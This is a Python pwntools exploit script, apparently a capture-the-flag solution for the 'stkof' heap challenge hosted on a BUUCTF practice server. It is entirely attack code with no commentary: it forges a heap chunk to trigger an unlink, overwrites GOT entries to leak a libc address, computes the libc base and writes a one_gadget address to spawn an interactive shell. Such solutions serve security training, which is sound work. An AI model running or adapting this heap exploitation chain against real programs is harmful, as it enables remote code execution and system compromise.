from pwn import *
r = remote('node3.buuoj.cn',29409)
#r = process('./stkof')
elf = ELF('./stkof')
libc = ELF('/libc-2.23.so')
#context.log_level='debug'
def add(size):
    r.sendline('1')
    r.sendline(str(size))
    r.recvuntil('OK')


def edit(index, size, content):
    r.sendline('2')
    r.sendline(str(index))
    r.sendline(str(size))
    r.send(content)
    r.recvuntil('OK')


def free(index):
    r.sendline('3')
    r.sendline(str(index))

add(0x60)
add(0x60)
add(0x80)
add(0x60)

ptr = 0x602140+0x10

fake_chunk = p64(0)#prev_size
fake_chunk += p64(0x61)#size
fake_chunk += p64(ptr-0x18)#fd
fake_chunk += p64(ptr-0x10)#bk
fake_chunk += p64(0)*8#padding
fake_chunk += p64(0x60)#prev_size
fake_chunk += p64(0x90)#size
edit(2,len(fake_chunk),fake_chunk)
free(3)#unlink
payload = p64(0)*2+p64(elf.got['free']) + p64(elf.got['atoi']) + p64(elf.got['atoi'])
edit(2,len(payload),payload)

payload = p64(elf.plt['puts'])
edit(1, len(payload), payload)
free(2)
r.recvline()
r.recvline()
leak = u64(r.recv(6).ljust(8,'\x00'))
libc_base = leak-libc.sym['atoi']
log.success(hex(libc_base))
one = libc_base+0x4526a
payload = p64(one)
edit(3,len(payload),payload)
r.interactive()